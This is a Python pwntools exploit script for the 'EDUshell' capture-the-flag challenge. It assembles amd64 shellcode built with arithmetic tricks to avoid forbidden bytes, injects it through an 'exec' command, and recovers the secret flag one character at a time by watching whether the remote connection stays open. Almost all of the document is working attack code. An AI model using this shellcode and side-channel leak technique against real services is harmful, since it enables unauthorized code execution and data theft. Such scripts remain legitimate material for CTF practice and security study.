#!/usr/bin/env python3
from pwn import *
import string
def exec(data):
    r.sendline(b'exec ' + data)

def loadflag():
    r.sendline('loadflag')

def help():
    r.sendline('help')

def cat(data):
    r.sendline('cat ' + data)

#r13 FLAG address
#r14 test index
#r12 test value
#r11 mmap address
shellcode = asm('''
                    mov r11, rdx
                    add r11, 0x1010107a
                    sub r11, 0x10101010
                    sub r12, 0x1011251
                    add r12, 0x1010101
                    mov r13, r12
                    add r13, 0x10141e1 
                    sub r13, 0x1010101
                    add r12, 0x10105c01     
                    sub r12, 0x10101001
                    mov rdi, 0x1010111
                    sub rdi, 0x1010111
                    mov rdx, 0x1010111 
                    sub rdx, 0x1010110
                    mov rsi, r12
                    syscall
                    mov r14, r13
                    add r14, [r12]
                test:
                    mov rax, 0x1010101
                    sub rax, 0x1010101
                    add r12, 0x1010111
                    sub r12, 0x1010110 
                    mov rsi, r12
                    syscall  
                    mov al, [r14]
                    mov r15, [r12]
                    cmp rax, r15
                    jne test
                    mov rax, 0x101014c
                    sub rax, 0x1010110
                    mov rdi, 0x1010111
                    sub rdi, 0x1010111
                    syscall  
    			''',  arch = 'amd64', os = 'linux')

print(shellcode)

 
flag = ''
for i in range(64):
    #r = process('./EDUshell')
    r = remote('eofqual.zoolab.org', 10101)
    loadflag()
    exec(shellcode)
    #index
    r.send(i.to_bytes(1, byteorder='big'))
    time.sleep(0.02)
    temp = ''
    for c in string.printable:
        if r.connected(direction = 'any') is True:
            #test value
            r.send(c)
            time.sleep(0.1)
            temp = chr(ord(c) - 1)        
        else:
            flag = flag + temp
            print(flag)
            break